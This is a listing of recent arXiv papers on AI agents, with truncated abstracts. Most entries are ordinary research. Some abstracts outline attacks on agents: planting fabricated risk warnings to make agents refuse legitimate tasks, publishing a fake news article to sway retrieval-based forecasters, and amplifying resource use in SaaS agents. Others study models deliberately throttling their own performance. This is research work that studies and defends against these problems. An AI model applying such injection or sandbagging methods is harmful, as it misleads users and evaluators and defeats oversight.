  - When we judge that our reasoning was defective, it seems plausible that we should abandon the conclusion it produced. This thought has special force for AI agents built to assess and correct their own work. Yet obeying such judgments can make an agent worse at distinguishing soun…

- **[MLIRBench - A Benchmark and Dataset for Compiler and Hardware-Aware Reasoning](https://arxiv.org/abs/2611.14881v1)**
  - *Pranava Sai Maganti, Meghasyam Peddireddy, Muzakker Hossain et al.*
  - `2026-11-11`
  - In recent years, large language models (LLMs) have become increasingly popular in software engineering and have performed well on different programming tasks. However, it is still difficult to know whether these models truly understand program behavior or whether they mainly rely…

- **[When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents](https://arxiv.org/abs/2611.14864v1)**
  - *Charles Xiao*
  - `2026-11-11`
  - An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. Our central premise is that safe…

- **[Gradient-Aware AI Agents for Autonomous Turbulence Model Discovery via Differentiable CFD](https://arxiv.org/abs/2611.16082v1)**
  - *Yi Liu, Xiantao Fan, Mingqi Xu et al.*
  - `2026-11-11`
  - Turbulence modeling relies on human choices of closure form, physical inputs, and tunable parameters. Training closures a posteriori is efficient only with gradients through long chaotic rollouts, which few solvers provide. Most a posteriori approaches therefore resort to gradien…

- **["It's Just a Small Weapon": What Rewarding Misbehavior During RL Does to Character-Trained Models](https://arxiv.org/abs/2611.16069v1)**
  - *Mohammad Omar Khursheed, Thomas Morris, Fabien Roger*
  - `2026-11-11`
  - Developers train models to follow a consistent character using methods like Model Spec Midtraining (Li et al., 2026), which have been hypothesized to make alignment more robust and generalize broadly. However, it is possible for subsequent RL with misspecified rewards to work aga…

- **[Wayfinder: Adaptive Resource Routing from Agent Citations](https://arxiv.org/abs/2611.16053v1)**
  - *Miguel Romero, George Karypis*
  - `2026-11-11`
  - To act effectively, agents must gather contextual information across resources such as chats, issue trackers, email and knowledge bases, to answer questions like "what was decided in the last project meeting?" or "where is the FAQ for our internal tooling?" Where this information…

- **[Imitating the Imperfect: Offline-to-Online Robust Imitation Learning from Heterogeneous Demonstrators](https://arxiv.org/abs/2611.16020v1)**
  - *Cheng Pan, Nan Lu, Kai Arulkumaran et al.*
  - `2026-11-11`
  - Imitation learning (IL) typically relies on large-scale offline demonstrations collected from multiple human or algorithmic demonstrators. However, most existing approaches assume these demonstrators are homogeneous or near-optimal experts, a convenient but unrealistic assumption…

- **[Reinforcement Learning for Inventory Control under Regime-Switching Demand: A Controlled Comparison of LSTM, MLP, and (s,S) Policies](https://arxiv.org/abs/2611.15945v1)**
  - *Alex Haines, Nathanael L. Baisa*
  - `2026-11-11`
  - Classical inventory policies such as (s,S) are provably optimal under stationary demand but cannot adapt when demand switches between hidden regimes, and memoryless deep reinforcement learning policies, confined to a fixed observation window, cannot maintain a belief over latent…

- **[Recompute or Restore? Host-Tier KV for Multi-Model Agent Workflows on a Static-Graph NPU Serving Stack](https://arxiv.org/abs/2611.15126v1)**
  - *Sungwon Woo, Seyeon Kim*
  - `2026-11-11`
  - Agent workflows issue dependent model calls that share long context prefixes, so serving them efficiently depends on reusing the key-value (KV) cache of those prefixes. On accelerators that compile model graphs ahead of time, however, the device KV budget is fixed, and prefixes e…

- **[One Fabrication Is Enough: A Fake News Article Changes the Forecasts of LLM Forecasting Systems](https://arxiv.org/abs/2611.15102v1)**
  - *Zeyu Zhang, Bradly C. Stadie*
  - `2026-11-11`
  - LLMs are increasingly used for forecasting, and the best forecasting systems retrieve news as evidence to strengthen their predictions. This also opens them to attack. We study the weakest attacker of this kind, who knows only the forecasting question and publishes fabricated new…

- **[Human-Likeness and Conversational Preference Diverge for Synthesized Agent Speech in Customer-Service Calls](https://arxiv.org/abs/2611.16051v1)**
  - *Jeffrey M. Girard, Antony D'Avirro, Jason Z. Zheng et al.*
  - `2026-11-11`
  - Listeners can judge an agent's speech on how human it sounds (human-likeness) and on how much they would want to talk to it (conversational preference). Listening tests rarely ask about conversational preference, so the relation between the two judgments is unclear. We compared t…

- **[Can Agents Relive Past Experiences? Diagnosing Event-Affect Decoupling in Affective-Episodic Retrospection](https://arxiv.org/abs/2611.15655v1)**
  - *Tingna Xie, Ming Wang, Shi Feng et al.*
  - `2026-11-11`
  - As memory-augmented agents increasingly support long-term and personalized interactions, reliable recall of emotional experiences while preserving their associated affect becomes necessary. However, existing evaluations usually assess emotion accuracy and factual memory grounding…

- **[CoLFA: Collaboration-Guided Lightweight Failure Attribution for LLM-Based Multi-Agent Systems](https://arxiv.org/abs/2611.14980v1)**
  - *Yufei Luo, Yuchen Ling, Chunrong Fang*
  - `2026-11-11`
  - Failure attribution in multi-agent systems requires tracing error formation to identify the decisive error step and the responsible agent. However, agents' division of work and information exchange lead to Interleaved Steps and Cluttered Content, requiring models to link executio…

- **[ToolTurns: Benchmarking LLM Agents in Multi-Turn Dialogue](https://arxiv.org/abs/2611.14925v1)**
  - *Milad Gholami, Brendan King, Jeffrey Flanigan*
  - `2026-11-11`
  - Tool-using language models are increasingly deployed in conversational settings, yet most large-scale tool-use benchmarks focus on isolated requests. We introduce ToolTurns, a benchmark of 2,620 problems spanning 1,827 tools and 11,004 API endpoints across 47 categories. Each dia…

- **[MULTILOOP: Evolving Multi-Agent Harnesses for Complex Information-Seeking Tasks](https://arxiv.org/abs/2611.15754v1)**
  - *Daniela Gottesman, Gal Yona, Ori Ram et al.*
  - `2026-11-11`
  - The performance of LLM-based agents depends not only on the underlying model but also on the harness: the prompts, tools, and orchestration logic around it. Recent works automate harness optimization with coding agents that analyze execution traces, diagnose failures, and edit th…

- **[GHA-SmellFix: Taking Action with Agentic LLMs for Detecting and Refactoring GitHub Actions Workflow Smells](https://arxiv.org/abs/2611.14963v1)**
  - *Anderson Uchôa, Jhefferson Souza, Emanuel Ávila et al.*
  - `2026-11-11`
  - Continuous integration and continuous delivery workflows are key artifacts in software projects. In GitHub Actions, they encode build, test, release, deployment, and security automation in YAML. These workflows contain configuration smells affecting security, reliability, maintai…

- **[Can We Make an LLM Dumber, or Is It Just Playing Dumb? An Empirical Study of Believable Performance Throttling](https://arxiv.org/abs/2611.15568v1)**
  - *Chengguang Gan, Yunhao Liang, Hanjun Wei et al.*
  - `2026-11-11`
  - A benchmark score is commonly read as a proxy for model capability. We study the inverse problem: can a model be driven to a target score, and do its failures resemble those of a naturally weaker model? We operationalize believable performance reduction along three axes: target c…

- **[Open Challenges and Opportunities in Human-Agent Systems](https://arxiv.org/abs/2611.14846v1)**
  - *Reuth Mirsky, Sarath Sreedharan, Nitay Alon et al.*
  - `2026-11-10`
  - Agentic AI systems increasingly undertake extended tasks and act on people's behalf, making human-agent interaction central to their effectiveness. Successful interaction requires understanding human perspectives, coordinating complementary capabilities, and maintaining productiv…

- **[OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design](https://arxiv.org/abs/2611.14808v1)**
  - *Ruiheng Yu, Oteo Mamo, Siyu Gan et al.*
  - `2026-11-10`
  - Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because th…

- **[Robust Task-Aware State Estimation from Pre-trained Perception](https://arxiv.org/abs/2611.14781v1)**
  - *Guy Azran, Sarah Keren*
  - `2026-11-10`
  - Agents that perform state estimation using pretrained perception models, e.g., Vision-Language Models (VLMs), face the fundamental challenge that predictions are uncertain. Still, most approaches determinize these predictions into a single best-guess state and make decisions as i…

- **[Mach2: Scientific Discovery Platform with Deterministic Execution Constraints](https://arxiv.org/abs/2611.14777v1)**
  - *Vansh Sharma, Venkat Raman*
  - `2026-11-10`
  - Language-model agents can formulate workflows and invoke specialized tools, yet compliance with natural-language operating rules is not guaranteed by prompting alone. Mach2 addresses this limitation by coupling Eigen orchestration to deterministic, lint-like checks of tool reques…

- **[Rational Use of Time for Social Coordination in Humans and AI](https://arxiv.org/abs/2611.14766v1)**
  - *Xiulin Yang, Sirisha Gudavalli, Jennifer Hu*
  - `2026-11-10`
  - All social interactions are situated in time. Previous studies have shown that humans are able to use implicit temporal cues, such as the duration of a pause, to infer others' mental states. But how do humans use temporal cues for dynamic, fine-grained social coordination? And ca…

- **[SynthCorp: A Platform for Creating Benchmarks for Data Agents](https://arxiv.org/abs/2611.14765v1)**
  - *Jiani Zhang, Manav Garg, Eugenie Lai et al.*
  - `2026-11-10`
  - Current benchmarks for LLM-driven data agents saturate quickly and cannot target specific capabilities. We present SynthCorp, a platform that creates customizable data estates and benchmarks by simulating how business events produce and modify corporate data over time. Each data…

- **[Together Compiler: Continual Compilation for AI Inference](https://arxiv.org/abs/2611.14681v1)**
  - *Reyna Abhyankar, Dylan Lim, Drew Wadsworth et al.*
  - `2026-11-10`
  - Today's AI workloads are rapidly changing: new models are released more often, model architectures are increasingly diverse, and traffic distributions change frequently. The challenge we face at Together AI is continual optimization for these changing workloads. Compiling a deplo…

- **[MITRA-Swarm: Injecting Explicit Linguistic Structure into Foundation Models for Classical Machine Translation](https://arxiv.org/abs/2611.14675v1)**
  - *Kayshav Bhardwaj, Pragun Seth, Kush Bhardwaj et al.*
  - `2026-11-10`
  - Classical Sanskrit poses three challenges unresolved by single-call monolithic models: morphophonemic fusion Sandhi, dense nominal compounding Samāsa, and discourse-level zero-anaphora forced by poetic meter. We present MITRA-Swarm, a multi-agent architecture injecting explicit l…

- **[Cleaning an Agent's History Hurts When the World Still Holds the Error](https://arxiv.org/abs/2611.14654v1)**
  - *Egor Pakhomov, Anurag Koul, Hongjun Liu et al.*
  - `2026-11-10`
  - Tool-using language-model agents accumulate histories of their own mistakes, and a system that compacts, repairs or hands off such a history decides what it says about those mistakes while their effects stay in the world. Prior work cleans the history at a fixed world, where show…

- **[Contrastive Discovery: Open-Ended Scientific Discovery over Competing Explanations](https://arxiv.org/abs/2611.14514v1)**
  - *Ziang Liu, James J. Kim, Yijia Dai et al.*
  - `2026-11-10`
  - LLM agents are increasingly used for open-ended, data-driven scientific discovery, yet most of them evaluate hypotheses pointwise, testing an empirical claim $h$ only against its complement $\neg h$. When evidence rejects $h$, the agent learns that one explanation is unlikely but…

- **[Comparative Analysis of Agent Evaluation Frameworks: Stability, Detection, and Discovery in Enterprise Analytics Agents](https://arxiv.org/abs/2611.14493v1)**
  - *Howard Zhang, Chuck Arvin, Logan Brown et al.*
  - `2026-11-10`
  - Deploying LLM-based analytics agents in enterprise settings requires evaluation frameworks that can reliably detect failures across complex, multi-tool workflows. We present a three-phase comparative study of three evaluation frameworks, each representing a distinct evaluation pa…

- **[ReTrace: Distilling Tool-Using Agents into Planner-Free Workflows](https://arxiv.org/abs/2611.14492v1)**
  - *Kaiyuan Hou, Yang Ping Kuo, Indranil Bhattacharya et al.*
  - `2026-11-10`
  - Business process automation runs the same Standard Operating Procedure (SOP) again and again on new inputs. Large Language Model (LLM) agents can follow an SOP written in natural language, but they call an LLM to choose every step of every run, which adds latency and cost at scal…

- **[One Policy for 100 Household Tasks: Our Solution for the 2026 BEHAVIOR Challenge](https://arxiv.org/abs/2611.14432v1)**
  - *Ilia Larchenko, Gleb Zarin, Atindra Nair et al.*
  - `2026-11-10`
  - We describe our solution for the 2026 BEHAVIOR Challenge: 100 long-horizon household tasks in the OmniGibson simulator. We placed 9th on the final leaderboard, the only independent team in the top 10. The core of the solution is a single vision-language-action (VLA) model, one ch…

- **[Evaluating LLM-Generated World Models for Neuro-Symbolic Reasoning](https://arxiv.org/abs/2611.14419v1)**
  - *Souhaila Djaffal, Amna Jamal, Gagana Madhugiri Devaraja et al.*
  - `2026-11-10`
  - Formal world models can support planning, verification, and safety reasoning, but constructing them from open-ended natural-language situations is difficult, particularly in multi-agent settings where several formalizations may be plausible. We study whether five LLMs can generat…

- **[KernelMosaic: An Open Dataset and Agentic Framework for CUDA Kernel Generation](https://arxiv.org/abs/2611.14604v1)**
  - *Ningyuan Xi, Yuhang Lai, Ning Miao*
  - `2026-11-10`
  - Training large language models to generate efficient CUDA kernels requires supervision spanning diverse computational requirements and iterative code optimization. Constructing this supervision is challenging because of heterogeneous specifications, and useful implementations eme…

- **[EngineAgent: Agentizing On-Device LLM Inference Engines with Inference Stack Hierarchy Awareness and Hardware Abilities](https://arxiv.org/abs/2611.14356v1)**
  - *Zhengxiang Huang, Yujie Sun, Shengheng Chen et al.*
  - `2026-11-10`
  - Rapidly evolving LLM architectures and heterogeneous mobile hardware make supporting new models in on-device inference engines a recurring and costly system challenge. Each model may require coordinated changes across conversion, graph construction, operators, and hardware backen…

- **[When Should Agents Remember? Falsification-Gated Self-Evolution for LLM Agents](https://arxiv.org/abs/2611.14326v1)**
  - *Runxuan Tang, Haoyu Gao, Yuyan Ding et al.*
  - `2026-11-10`
  - LLM agents increasingly operate in long-horizon, verifier-rich environments, but current self-improvement mechanisms often write episode-derived lessons directly into memory, making local success an unreliable signal for reusable and safe knowledge. This paper addresses the core…

- **[Don't Just Trust Your Memory: Evidence-Linked Memory Reduces Memory-Induced Degradation in LLM Agents](https://arxiv.org/abs/2611.14320v1)**
  - *Yukyeong Lee, Yumin Choi, Jinheon Baek et al.*
  - `2026-11-10`
  - External memory enables LLM agents to improve from experience by distilling trajectories of past tasks into concise lessons for new tasks. However, memory can also lead to memory-induced degradation, where an agent fails on tasks it would solve without memory, often because it fo…

- **[Lilo: A Multi-Agent Conversational Sandbox for Children's Digital Communication](https://arxiv.org/abs/2611.14260v1)**
  - *Ofri Elbaum, Amit Malik, Tomer Malkevich et al.*
  - `2026-11-10`
  - Children's peer conflicts increasingly play out in group chats, where tone and timing are stripped away, and a hurtful message is easier to send than to say aloud. We present Lilo, a multi-agent conversational system that lets children practice such conversations, so they are bet…

- **[Personalized Affective Perception via Continual Learning in Human-Agent Negotiation](https://arxiv.org/abs/2611.14247v1)**
  - *Mehmet Onur Keskin, Berk Buzcu, Nikhil Churamani et al.*
  - `2026-11-10`
  - Self-interested intelligent agents that negotiate with humans should interpret nonverbal expressions and adapt their behavior accordingly. However, generic facial-affect models degrade across individuals and contexts, creating a generalization gap. We introduce an affect-adaptive…

- **[Verifiable Agentic Traffic Class: A Policed Quality-of-Service Mechanism for Agentic AI Traffic, Evaluated from Simulation to Real-Kernel Adversarial Testing](https://arxiv.org/abs/2611.14211v1)**
  - *Naveen Babu Narayanan Nair, Sajay Kurup*
  - `2026-11-10`
  - Software agents built on large language models generate traffic unlike human web traffic, yet routers have no class for it and cannot verify a sender's claim to be an agent. This paper proposes the Verifiable Agentic Traffic Class (VATC), which combines a reserved Differentiated…

- **[Looking One Step Ahead: An Anticipation-guided Agent for Object State Readout in Videos](https://arxiv.org/abs/2611.14113v1)**
  - *Yuanhe Tian, Yan Song*
  - `2026-11-10`
  - Understanding the progress of an activity requires tracking how the objects involved change over time. Object state readout provides this information by describing a target object's states and transitions across video frames. Although multimodal large language models (MLLMs) gene…

- **[Model-Free Runtime Measurement of Task-Relevant Information](https://arxiv.org/abs/2611.14111v1)**
  - *Dimitris Panagopoulos, Adolfo Perrusquía, Yang Xing et al.*
  - `2026-11-10`
  - Autonomous systems increasingly monitor physical kinematics, environmental states and task completion outcomes. While existing work provides methods to plan information seeking actions and interpret acquired observations, current approaches do not monitor whether the live process…

- **[ProofCoder: Continuous Reasoning for Automated Software Verification](https://arxiv.org/abs/2611.14106v1)**
  - *Martim Afonso, Inês Lynce, Maurizio Morisio et al.*
  - `2026-11-10`
  - Formal verification using proof assistants provides strong correctness guarantees for software, but constructing proofs remains labor-intensive and requires significant expertise. Recent approaches based on large language models (LLMs) have shown promise in automating proof synth…

- **[Program-Aided Patchable Skill Evolution](https://arxiv.org/abs/2611.14019v2)**
  - *Jiahao Wang, Yuqi Xiong, Qing Yang et al.*
  - `2026-11-10`
  - Agent skills have emerged as an effective means of enabling LLM agents to solve complex, interactive tasks by encoding reusable knowledge without modifying model parameters. Recent approaches further improve skill adaptation by distilling reusable experience from agent execution…

- **[Personalized Memory Rubrics: Learning What to Remember per User via Rubric-Guided Credit Assignment](https://arxiv.org/abs/2611.14017v1)**
  - *Yupeng Han, Kai Zhang, Shuochen Liu et al.*
  - `2026-11-10`
  - Long-horizon personalized agents maintain an evolving memory by continuously deciding what to add, modify, or discard. However, learning an optimal update policy remains challenging. Conventional training relies solely on terminal question-answering accuracy, yielding a coarse fe…

- **[Coding Agent Memory Post-Training II: Unlocking the Memory Potential of Pre-trained File Operations for Long-Horizon Tasks via On-Policy Distillation](https://arxiv.org/abs/2611.14009v2)**
  - *Lirui Luo, Kelong Mao, Xinwei Yang et al.*
  - `2026-11-10`
  - Language-model agents increasingly tackle long-horizon tasks whose interaction histories exceed the model's active context. They must therefore decide what to write down and what to read back, and when to do either. Recent work has begun to use on-policy distillation (OPD) to mak…

- **[Controlled Knowledge Engineering for Taxonomy Induction with Tool-Grounded LLM Agents and Runtime-Adaptive Policies](https://arxiv.org/abs/2611.13966v1)**
  - *Jonas Limniatis, Bennet Schaarmann, Georg Reuber et al.*
  - `2026-11-10`
  - Taxonomies are structured knowledge representations that support semantic search, recommendation, product catalog organization, and retrieval-augmented generation. Their automated construction from a fixed set of candidate entities requires more than plausible text generation: th…

- **[TreeAgent: Structure-Aware Memory Agent for Processing Long Hierarchical Data](https://arxiv.org/abs/2611.13946v1)**
  - *Wei Gu, Weiwei Qi, Jiajun Tang et al.*
  - `2026-11-10`
  - Practical Web applications increasingly require agents to interpret long conversations or documents. For inputs exceeding the context windows of large language models (LLMs), memory agents process segments sequentially and retain past information in bounded memory. However, they…

- **[Chem World: A Large-Scale Benchmark and Physics-Aware Framework for Trustworthy Molecular Property Prediction](https://arxiv.org/abs/2611.13945v1)**
  - *Tianyou Bai, Huan Wang, Mingchen Gao et al.*
  - `2026-11-10`
  - Molecular property prediction is fundamental to computational chemistry and drug formulation research, yet existing benchmarks remain fragmented across datasets, properties, and evaluation protocols, limiting systematic evaluation of model generalization. We introduce Chem World,…

- **[Softness is something you also need! Why compliance helps control: information metrics of a passive walker with compliant ankle](https://arxiv.org/abs/2611.13779v1)**
  - *Fabio Bonsignorio, Elisabetta Barletta, Sorin Dragomir et al.*
  - `2026-11-10`
  - A great gap in adaptivity, flexibility, and dexterity still exists between intelligent robots, whether they are made of rigid or (partially) compliant components, and their naturally evolved animal and vegetal counterparts. One reason could be of `paradigm' nature. On the one han…

- **[DisasterAgent: An Evidence-Driven Agent for Verifiable Disaster Report Generation From Remote Sensing Imagery](https://arxiv.org/abs/2611.13776v1)**
  - *Zhijian Li, Jiawei Song, Chao Ren et al.*
  - `2026-11-10`
  - Remote sensing disaster assessment is moving from simple damage classification toward comprehensive report-level analysis. In this setting, responders need not only damage descriptions but also verifiable evidence to guide response and recovery. Recent vision-language models (VLM…

- **[Toward Autonomous RTL and Synthesis Optimization: Benchmarking and Self-Improving Agents](https://arxiv.org/abs/2611.13713v1)**
  - *Wenji Fang, Yao Lu, Jinghua Wang et al.*
  - `2026-11-10`
  - Recent advances in large language models (LLMs) and autonomous agents are creating new opportunities for hardware design optimization. This paper examines three connected directions toward autonomous RTL and synthesis optimization: (1) Realistic benchmarking. We discuss reference…

- **[Agentic AI Meets Formal Verification in the Era of Agentic Hardware Development](https://arxiv.org/abs/2611.13705v1)**
  - *Wenji Fang, Yuchao Wu, Jing Wang et al.*
  - `2026-11-10`
  - As AI agents become increasingly capable of generating and optimizing hardware circuits, ensuring the correctness of AI-generated designs becomes more important. Meanwhile, advances in AI lower the barriers to developing and applying formal methods, creating new opportunities to…

- **[On Private Knowledge Retrieval and Private Inference for secure multi-agent systems](https://arxiv.org/abs/2611.13696v1)**
  - *Vicenç Torra, Maria Bras-Amorós*
  - `2026-11-10`
  - Multi-agent systems provide a convenient framework for the massive deployment of agents based on Large Language Models (LLMs). It provides a sound framework where agents can interact with existing software to perform actions in an autonomous way. Agentic AI is the new term to den…

- **[A computational framework for understanding embodied plans](https://arxiv.org/abs/2611.13669v1)**
  - *Aalap D. Shah, Basil Saeed, Joshua B. Tenenbaum et al.*
  - `2026-11-10`
  - Reasoning about people's plans and goals based on their actions is fundamental to human social interaction and essential for cooperative, embodied artificial intelligence. Formalizing this capacity in naturalistic, embodied settings has been a longstanding challenge. Here, we pre…

- **[DrugCoding: A Scientific Programming Agent for Drug Discovery](https://arxiv.org/abs/2611.13651v2)**
  - *Junwei Hu, Zhuohao Lin, Kun Li et al.*
  - `2026-11-10`
  - Drug discovery involves multiple interconnected research stages, including molecular design, property prediction, and virtual screening. These processes are characterized by complex workflows, interdependent computational tasks, and diverse specialized tools, placing substantial…

- **[Synapse-Control: Making Agent Experience Actionable with Lightweight Runtime Control](https://arxiv.org/abs/2611.13615v1)**
  - *Zhiyuan Huang, Shengan Zheng, Chenghu Yang et al.*
  - `2026-11-10`
  - Large language model agents reuse execution experience to improve reliability on complex tool-based tasks. Systems such as Sentry call large models to generate failure diagnoses before retrieving advice, adding inference cost to experience reuse. We present Synapse-Control, an ag…

- **[When Evaluators of AI Agents Disagree: An Empirical Study of Native Scoring, LLM Judges, and Commit-Boundary Checks on tau2-bench](https://arxiv.org/abs/2611.14581v1)**
  - *Sungbin Im*
  - `2026-11-10`
  - Agentic workflows, in which a large language model (LLM) calls tools to read and write data, are evaluated in two ways. Benchmarks compare the final state against a gold answer. Deployed services have none; an LLM judge reads the transcript and decides. Practice treats the two as…

- **[Agent Benchmarks Stop Ranking Before They Run Out of Tasks](https://arxiv.org/abs/2611.13541v1)**
  - *Zihan Dong, Qishi Zhan, Minxuan Hu*
  - `2026-11-10`
  - Data-science and ML-engineering agents are evaluated on benchmarks such as MLE-bench, ALE-Bench, SWE-fficiency and AlgoTune, whose tasks yield a quantity (a Kaggle metric, contest score or speedup). When one stops separating the best models, the usual remedy is a harder version.…

- **[SafeRoute-MAS: Coverage-Aware and Risk-Calibrated Message Routing for Multi-Agent Scientific Reasoning](https://arxiv.org/abs/2611.13454v1)**
  - *Zhiming Xue, Jianan Liu, Weiran Yan et al.*
  - `2026-11-10`
  - We introduce SafeRoute-MAS, a coverage-aware, risk-calibrated procedure that keeps all specialist messages or removes one using only pre-integration information. On a sealed cache of 5,328 committees, its source-compatible operating point gains +1.80 percentage points (95% CI [+1…

- **[Placing LLM Lookup Tables by Per-Layer Prefetch Deadlines](https://arxiv.org/abs/2611.13413v1)**
  - *Wen Huang, Jack Liu*
  - `2026-11-10`
  - DeepSeek-V4.1's 203 GB of Engram n-gram tables sit in host DRAM today, taking 190 of the 223 GiB a 4-GPU serving process uses. Row indices depend only on input tokens, so reads can start with each step and overlap earlier layers. V4.1's two Engram layers have windows that differ…

- **[Bursts That Outlast Themselves: Persistent Degradation in Prefix-Cached Agent Serving](https://arxiv.org/abs/2611.13412v1)**
  - *Wen Huang, Jack Liu*
  - `2026-11-10`
  - LLM agents drive inference engines with closed-loop sessions whose context grows every turn, and serving them economically depends on prefix caching: a hit costs an incremental prefill of about a thousand tokens, a miss recomputes a 10--40K-token context. We show that this makes…

- **[SteerDistill: Quantizing LLM Agents via Closed-Loop Teacher Steering](https://arxiv.org/abs/2611.13410v1)**
  - *Genming Cui, Xiangyu Li, Zixu Hao et al.*
  - `2026-11-10`
  - Low-bit quantization reduces the inference cost of LLM agents but can compromise task success. Examining failed rollouts, we find that quantized agents overlook task requirements or environmental conditions, producing environment transitions that diverge from successful full-prec…

- **[Stinging the Swarm: Extracting Attacker Intelligence from a Twin-Controller OT Honeypot](https://arxiv.org/abs/2611.13406v1)**
  - *Canyon Grey Dell'Omo, Joao Pedro de Carvalho Voltani*
  - `2026-11-10`
  - Autonomous language-model agents can drive industrial controllers over fieldbus protocols, probing a plant at machine speed and in coordinated swarms. We present Talos, an inline gate that judges every agent request to a controller in milliseconds and routes agents it flags as ho…

- **[Living constitutions: Participatory alignment for sovereign foundation models](https://arxiv.org/abs/2611.13402v1)**
  - *Stine Lyngsø Beltoft, Jonas Vistrup, Peter Schneider-Kamp et al.*
  - `2026-11-10`
  - In Constitutional AI, a plain-text "constitution" encodes values and gets incorporated into a model via post-training. However, the procedure for creating such a constitution poses significant challenges: who contributes, who decides which norms are included, and to what extent m…

- **[The AI Era's Lines of Code? A Case Study on What an Engineer's Token Spend Measures](https://arxiv.org/abs/2611.13396v1)**
  - *Shyam Agarwal, Olga Lvova, Agnia Sergeyuk et al.*
  - `2026-11-10`
  - Organizations use engineers' token spend to monitor AI adoption, set budgets, and measure productivity, but the metric's relationship with engineering output is unclear. We link five weeks of token usage in coding agents to the commits of 404 engineers at JetBrains, and analyze a…

- **[A New Framework for Quantum Reinforcement Learning](https://arxiv.org/abs/2611.14731v1)**
  - *Alireza Tavakoli, Mohsen Heidari*
  - `2026-11-10`
  - Quantum reinforcement learning (QRL) has emerged as a promising approach for controlling quantum systems and accelerating learning tasks with quantum resources. However, most existing QRL formulations still retain a classical reinforcement learning interface: states and actions a…

- **[Pyrite: Building and Benchmarking Protein-Ligand Pose Ranking Agents](https://arxiv.org/abs/2611.14511v1)**
  - *Megha Srivastava, Michael H. Lim, Allison M. Keys et al.*
  - `2026-11-10`
  - Predicting how a ligand binds to its target is central to small-molecule drug discovery. Modern cofolding models can generate diverse candidate poses, but reliably ranking these candidates remains challenging. We introduce Pyrite, a pairwise pose-ranking benchmark comprising 1,50…

- **[Continual-ARC: Measuring Skill Acquisition over a Working Lifetime](https://arxiv.org/abs/2611.14505v2)**
  - *Daniel Lenton, Yusha Arif, Haris Mahmood*
  - `2026-11-10`
  - Agent harnesses have emerged as a promising mechanism for continual learning, alongside test-time parametric learning. However, the current benchmarks have several limitations: they generally focus on a single applied domain, serve each instance only once, and assume a single fam…

- **[MMDM: Measuring Massive Multitask Decision Making](https://arxiv.org/abs/2611.14309v1)**
  - *Junhao Shen, Qing Zong, Yue Guo et al.*
  - `2026-11-10`
  - System-1 Decision Models directly make structured probabilistic decisions over query-specified options given a state in a single forward pass, without autoregressively generating reasoning trajectories or textual responses. Recent evaluations cover diverse tasks but often rely on…

- **[Tree-Ising: Repairing Language Models with Bit-Level Ising Edits](https://arxiv.org/abs/2611.14210v1)**
  - *Hadi Salloum, Ammar Ali*
  - `2026-11-10`
  - Weight-space programming, introduced in recent MIT work by Takehi et al., enables a frontier LLM agent to read a network's weights and write a repair. Their GPT-6 Astra agent corrected the reasoning loops of Qwen3.5-0.8B without gradients, using 158 agent turns, 89.7 million toke…

- **[What a CAGE 4 Score Measures: An Audit of a Learned Cyber-Defense Benchmark, Its Reference Defenders, and the Tables Built on Them](https://arxiv.org/abs/2611.14068v1)**
  - *James Rice, Ji Hwan Park, Andres Kwasinski*
  - `2026-11-10`
  - CAGE Challenge 4 is the benchmark on which learned multi-agent cyber defenders are compared. We reproduce its two reference defenders, KEEP and H-MARL Expert, in a pinned container and show that three things read from it measure less than they are taken to measure. First, the sim…

- **[BioXArena-Pro: a research-grade benchmark for autonomous biomedical machine learning agents](https://arxiv.org/abs/2611.13994v1)**
  - *Loka Li, Duzhen Zhang, Xingbo Du et al.*
  - `2026-11-10`
  - Coding agents are increasingly proposed as autonomous builders of biomedical models, but existing benchmarks are small, near saturation or open to leaked information. We present BioXArena-Pro, 64 research-level modelling tasks from eight biomedical domains, each rebuilt from a pu…

- **[The RSI Tax: When Recursive Self-Improvement Is Not Worth the Cost](https://arxiv.org/abs/2611.13524v1)**
  - *Yitong Zhang, Ang Li, Yisen Wang*
  - `2026-11-10`
  - Recursive self-improvement (RSI) seeks to improve an agent using its own task experience. Its practical value depends on whether performance gains justify the full cost of self-improvement and task execution. We evaluate this trade-off on continual task streams, scoring each task…

- **[Deep Personalization: Continuous Context Observation for Local Proactive Agents](https://arxiv.org/abs/2611.13457v1)**
  - *Yijia Shao, Song Bian, Junxian Guo et al.*
  - `2026-11-10`
  - As AI agents become increasingly capable, users must still recognize when and how to ask for help, leaving many opportunities for useful support unrealized. Proactive agents hold the promise to close this gap, but effective proactivity requires understanding users' real-time acti…

- **[Plumbline: When the Loss Lies, Validating LLM Training Correctly](https://arxiv.org/abs/2611.13393v1)**
  - *Ruochen Wen, Hongyang Wang, Siwei Li et al.*
  - `2026-11-10`
  - Correctness is a prerequisite for training large language models (LLMs) at scale, yet it is hard to ensure: a fault can sit in any part of a run, and how it shows differs across frameworks and the libraries they depend on. Some failures are loud and some are silent, and both take…

- **[An LLM Is All You Need: Data-Efficient Adaptation to Full-Duplex, Word-Level Spoken Dialogue](https://arxiv.org/abs/2611.14774v1)**
  - *Tairan Chen, Richard Yucheng He, Yihang Liu et al.*
  - `2026-11-10`
  - Full-duplex spoken dialogue, in which a system listens while it speaks and can backchannel, yield the floor, and be interrupted, is usually obtained by training on hundreds of thousands to millions of hours of speech. This is costly, rewrites the language model that supplies the…

- **[Probe What-If Worlds Before You Ship: Persona Simulation for Real-World Decision Making](https://arxiv.org/abs/2611.14700v1)**
  - *Julie Zhu, Jianheng Hou, Zhixu Silvia Tao et al.*
  - `2026-11-10`
  - User research and system testing reveal whether products and services meet user needs, yet recruiting specialized participants, designing controlled what-if comparisons, and repeating studies as designs evolve often bottleneck design iteration and data-driven decision-making. We…

- **[Earlybird: Predictive Streaming Speech Recognition in 29M Parameters](https://arxiv.org/abs/2611.14421v1)**
  - *Sahil Mahendrakar*
  - `2026-11-10`
  - Streaming speech recognizers output a word only after the speaker has finished it, typically 90-400 ms later. For a voice agent every millisecond counts: the sooner the words are outputted, the sooner the agent can start a search or plan its reply. We present Earlybird, a 29M-par…

- **[ARE-bench: Benchmarking Agents' Research Ability in Real-World Researcher Sessions and Workspaces](https://arxiv.org/abs/2611.14364v1)**
  - *Jiahang Lin, Wanying Ren, Wanghan Xu et al.*
  - `2026-11-10`
